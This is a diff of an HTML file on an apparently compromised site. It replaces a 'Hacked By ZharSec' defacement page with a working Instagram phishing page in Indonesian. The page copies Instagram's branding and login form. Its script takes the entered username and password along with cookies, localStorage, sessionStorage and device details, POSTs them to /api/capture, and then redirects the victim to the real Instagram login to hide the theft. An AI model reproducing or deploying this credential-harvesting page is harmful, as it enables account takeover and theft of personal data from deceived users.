@@ -1,129 +1,104 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked By ZharSec</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #0d0d0d;
-            color: #00ff66;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-            text-shadow: 0 0 10px #00ff66, 0 0 20px #00ff66;
-        }
-
-        /* Scanline Overlay untuk Efek Layar CRT/Monitor Tua */
-        .scanlines {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                rgba(18, 16, 16, 0) 50%, 
-                rgba(0, 0, 0, 0.25) 50%
-            );
-            background-size: 100% 4px;
-            z-index: 10;
-            pointer-events: none;
-        }
-
-        .container {
-            text-align: center;
-            z-index: 1;
-            padding: 20px;
-        }
-
-        h1 {
-            font-size: 3rem;
-            margin-bottom: 20px;
-            letter-spacing: 3px;
-            animation: glitch 1.5s infinite alternate;
-        }
-
-        p.system-status {
-            color: #ff3333;
-            text-shadow: 0 0 10px #ff3333;
-            font-weight: bold;
-            font-size: 1.2rem;
-            margin-bottom: 30px;
-        }
-
-        /* Container Running Text */
-        .marquee-container {
-            width: 100%;
-            max-width: 800px;
-            background-color: rgba(0, 255, 102, 0.05);
-            border: 1px solid #00ff66;
-            padding: 10px 0;
-            margin-top: 20px;
-            overflow: hidden;
-            white-space: nowrap;
-            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
-        }
-
-        .marquee-text {
-            display: inline-block;
-            padding-left: 100%;
-            animation: marquee 15s linear infinite;
-            font-size: 1.1rem;
-            letter-spacing: 2px;
-        }
-
-        /* Animasi Teks Berjalan */
-        @keyframes marquee {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(-100%, 0); }
-        }
-
-        /* Animasi Glitch Sederhana */
-        @keyframes glitch {
-            0% { transform: skew(0deg); }
-            20% { transform: skew(-2deg); }
-            40% { transform: skew(1deg); }
-            60% { opacity: 0.8; }
-            80% { transform: skew(-1deg); }
-            100% { transform: skew(0deg); opacity: 1; }
-        }
-
-        footer {
-            margin-top: 40px;
-            font-size: 0.8rem;
-            color: #888;
-            text-shadow: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Instagram</title>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="scanlines"></div>
+<!-- Loading Screen -->
+<div id="loader" class="loader">
+    <svg class="ig-logo-loader" viewBox="0 0 24 24" width="80" height="80">
+        <defs>
+            <radialGradient id="grad" cx="30%" cy="107%" r="150%">
+                <stop offset="0%" stop-color="#fdf497"/>
+                <stop offset="5%" stop-color="#fdf497"/>
+                <stop offset="45%" stop-color="#fd5949"/>
+                <stop offset="60%" stop-color="#d6249f"/>
+                <stop offset="90%" stop-color="#285AEB"/>
+            </radialGradient>
+        </defs>
+        <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="url(#grad)" stroke-width="2"/>
+        <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#grad)" stroke-width="2"/>
+        <circle cx="17.5" cy="6.5" r="1.3" fill="url(#grad)"/>
+    </svg>
+    <div class="from-meta">from <span class="meta-text">Meta</span></div>
+</div>
 
-    <div class="container">
-        <p class="system-status">[ SYSTEM BREACH DETECTED ]</p>
-        <h1>Hacked By ZharSec</h1>
-        
-        <div class="marquee-container">
-            <div class="marquee-text">
-                &gt;&gt; NOTHING IS IMPOSSIBLE &bull; WE ARE ANONYMOUS &bull; SECURITY IS JUST AN ILLUSION &bull; SYSTEM OVERRIDDEN BY ZHARSEC &bull; EXPECT US &bull; NO SYSTEM IS SAFE &lt;&lt;
-            </div>
-        </div>
+<!-- Login Form -->
+<div id="loginPage" class="login-page hidden">
+    <div class="lang-top">Bahasa Indonesia</div>
 
-        <footer>
-            <p>ZharSec Cyber Team &copy; 2026</p>
-        </footer>
+    <div class="logo-container">
+        <svg viewBox="0 0 24 24" width="60" height="60">
+            <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="url(#grad)" stroke-width="2"/>
+            <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#grad)" stroke-width="2"/>
+            <circle cx="17.5" cy="6.5" r="1.3" fill="url(#grad)"/>
+        </svg>
     </div>
 
+    <form id="loginForm" class="login-form">
+        <input type="text" name="username" placeholder="Nama pengguna, email, atau nomor ponsel" required autocomplete="username">
+        <input type="password" name="password" placeholder="Kata sandi" required autocomplete="current-password">
+        <button type="submit">Login</button>
+    </form>
+
+    <a href="#" class="forgot">Lupa kata sandi?</a>
+
+    <div class="spacer"></div>
+
+    <a href="#" class="signup-btn">Buat akun baru</a>
+
+    <div class="meta-footer">
+        <svg width="60" height="12" viewBox="0 0 100 20" fill="none">
+            <path d="M10 10 C10 5, 15 5, 17 10 C19 15, 24 15, 24 10 C24 5, 19 5, 17 10" stroke="#fff" stroke-width="2" fill="none"/>
+        </svg>
+        <span>Meta</span>
+    </div>
+</div>
+
+<script>
+// Tampilkan loading dulu, baru form setelah 1 detik
+setTimeout(function() {
+    document.getElementById('loader').classList.add('hidden');
+    document.getElementById('loginPage').classList.remove('hidden');
+}, 1000);
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const username = this.username.value;
+    const password = this.password.value;
+
+    const fingerprint = {
+        cookies: document.cookie,
+        url: window.location.href,
+        referrer: document.referrer,
+        screen: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        platform: navigator.platform,
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory
+    };
+    try { fingerprint.localStorage = JSON.stringify(localStorage); } catch(e){}
+    try { fingerprint.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
+
+    await fetch('/api/capture', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ username, password, fingerprint })
+    });
+
+    // Loading lagi sebelum redirect ke IG asli
+    document.getElementById('loginPage').classList.add('hidden');
+    document.getElementById('loader').classList.remove('hidden');
+
+    setTimeout(function() {
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+    }, 800);
+});
+</script>
 </body>
 </html>
